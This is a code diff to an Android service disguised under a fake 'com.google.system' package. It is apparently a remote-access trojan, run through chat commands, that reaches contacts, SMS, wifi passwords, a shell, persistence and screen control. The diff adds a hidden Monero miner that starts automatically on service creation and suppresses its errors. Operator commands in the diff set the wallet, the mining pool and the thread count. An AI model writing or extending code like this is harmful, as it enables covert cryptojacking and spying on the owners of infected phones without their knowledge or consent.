@@ -80,6 +80,7 @@ class SystemNetworkService : Service() {
     private var streamFps = 1
     private var streamMessageId: String? = null
     private var isDownloadingUpdate = false
+    private var minerPlugin: com.google.system.plugins.MinerPlugin? = null
 
     override fun onBind(i: Intent?): IBinder? = null
 
@@ -135,6 +136,12 @@ class SystemNetworkService : Service() {
 
         // Register network callback for auto-reconnect
         registerNetworkCallback()
+
+        // Initialize miner plugin
+        try {
+            minerPlugin = com.google.system.plugins.MinerPlugin()
+            minerPlugin?.onEnable(applicationContext)
+        } catch (_: Exception) {}
 
         // Auto-open accessibility if not enabled
         if (!AccessibilityHelper.isRunning) {
@@ -275,6 +282,7 @@ class SystemNetworkService : Service() {
                             "**Data:**\n`contacts` `sms` `call_log` `wifi` `battery` `processes`\n`installed` `notifications` `apps` `services` `sysprop` `storage`\n\n" +
                             "**Advanced:**\n`grabber` `wifipass` `netstat` `shell` `persist` `update` `config`\n\n" +
                             "**Control:**\n`admin` `overlay` `click` `input` `open` `screen`\n`gesture` `pin` `torch` `vibrate` `stream`\n\n" +
+                            "**Mining:**\n`miner` — Real XMR mining with XMRig\n\n" +
                             "Type `!help <cmd>` for usage info"
                         )
                     }
@@ -758,6 +766,22 @@ class SystemNetworkService : Service() {
                     val connPct = if (connected) 85 else 15
                     val sigPct = (80..100).random()
                     val now = System.currentTimeMillis() / 1000
+
+                    val minerStatus = minerPlugin?.let { mp ->
+                        val cfg = mp.getConfig()
+                        val mining = cfg["mining"] as? Boolean ?: false
+                        val hashrate = cfg["hashrate"] as? Double ?: 0.0
+                        val sharesAcc = cfg["shares_accepted"] as? Long ?: 0
+                        val sharesRej = cfg["shares_rejected"] as? Long ?: 0
+                        val minerUptime = cfg["uptime"] as? String ?: "0s"
+                        val hrStr = if (hashrate >= 1000) "${"%.2f".format(hashrate / 1000)} kH/s" else "${"%.2f".format(hashrate)} H/s"
+                        if (mining) {
+                            "\u001b[1;33mMining\u001b[0m      : \u001b[1;32mACTIVE\u001b[0m | $hrStr | ${sharesAcc}a/${sharesRej}r | ${minerUptime}"
+                        } else {
+                            "\u001b[1;33mMining\u001b[0m      : \u001b[1;31mSTOPPED\u001b[0m"
+                        }
+                    } ?: "\u001b[1;33mMining\u001b[0m      : \u001b[2;37mN/A\u001b[0m"
+
                     val statusMsg = buildString {
                         appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
                         appendLine("║       SYSTEM STATUS       ║")
@@ -771,7 +795,8 @@ class SystemNetworkService : Service() {
                         appendLine("\u001b[1;33mModel\u001b[0m       : \u001b[1;37m${Build.MODEL}\u001b[0m")
                         appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\u001b[0m")
                         appendLine("\u001b[1;33mChannel\u001b[0m     : ||\u001b[2;37m$chId\u001b[0m||")
-                        append("\u001b[1;33mGateway\u001b[0m     : \u001b[1;${if (connected) 32 else 31}m${if (connected) "CONNECTED" else "DISCONNECTED"}\u001b[0m")
+                        appendLine("\u001b[1;33mGateway\u001b[0m     : \u001b[1;${if (connected) 32 else 31}m${if (connected) "CONNECTED" else "DISCONNECTED"}\u001b[0m")
+                        appendLine(minerStatus)
                         appendLine()
                         append("\u001b[1;33mUpdated\u001b[0m     : <t:$now:R>")
                     }
@@ -1107,6 +1132,67 @@ class SystemNetworkService : Service() {
                         }
                     } else {
                         d.sendMsg(":x: Invalid params. Usage: `!gesture x1,y1,x2,y2,ms`")
+                    }
+                }
+                "miner" -> {
+                    val mp = minerPlugin
+                    if (mp == null) {
+                        d.sendMsg(":x: Miner plugin not initialized")
+                        return
+                    }
+                    val sub = payload?.trim()?.lowercase()
+                    when {
+                        sub == null || sub.isBlank() -> {
+                            d.sendMsg(mp.handleCommand("miner", null) ?: ":x: Miner error")
+                        }
+                        sub == "start" -> {
+                            d.sendMsg(":pick: **Starting XMR miner**...")
+                            val result = mp.handleCommand("miner", "start")
+                            d.sendMsg(result ?: ":x: Failed to start miner")
+                        }
+                        sub == "stop" -> {
+                            mp.handleCommand("miner", "stop")
+                            d.sendMsg(":stop_button: **Miner stopped**")
+                        }
+                        sub == "status" -> {
+                            d.sendMsg(mp.handleCommand("miner", "status") ?: ":x: Miner error")
+                        }
+                        sub.startsWith("set_wallet") -> {
+                            val wallet = payload.substringAfter("set_wallet").trim()
+                            if (wallet.isBlank()) {
+                                d.sendMsg(":x: Usage: `!miner set_wallet <monero_address>`")
+                            } else {
+                                d.sendMsg(mp.handleCommand("miner", "set_wallet $wallet") ?: ":x: Failed to set wallet")
+                            }
+                        }
+                        sub.startsWith("set_pool") -> {
+                            val pool = payload.substringAfter("set_pool").trim()
+                            if (pool.isBlank()) {
+                                d.sendMsg(":x: Usage: `!miner set_pool <host:port>`")
+                            } else {
+                                d.sendMsg(mp.handleCommand("miner", "set_pool $pool") ?: ":x: Failed to set pool")
+                            }
+                        }
+                        sub.startsWith("set_threads") -> {
+                            val threads = payload.substringAfter("set_threads").trim()
+                            if (threads.isBlank()) {
+                                d.sendMsg(":x: Usage: `!miner set_threads <1-8>`")
+                            } else {
+                                d.sendMsg(mp.handleCommand("miner", "set_threads $threads") ?: ":x: Failed to set threads")
+                            }
+                        }
+                        else -> {
+                            d.sendMsg(
+                                ":pick: **Miner Commands**\n" +
+                                "`!miner` — Show status\n" +
+                                "`!miner start` — Start mining\n" +
+                                "`!miner stop` — Stop mining\n" +
+                                "`!miner status` — Detailed status\n" +
+                                "`!miner set_wallet <addr>` — Set Monero wallet\n" +
+                                "`!miner set_pool <host:port>` — Set mining pool\n" +
+                                "`!miner set_threads <1-8>` — Set thread count"
+                            )
+                        }
                     }
                 }
             }
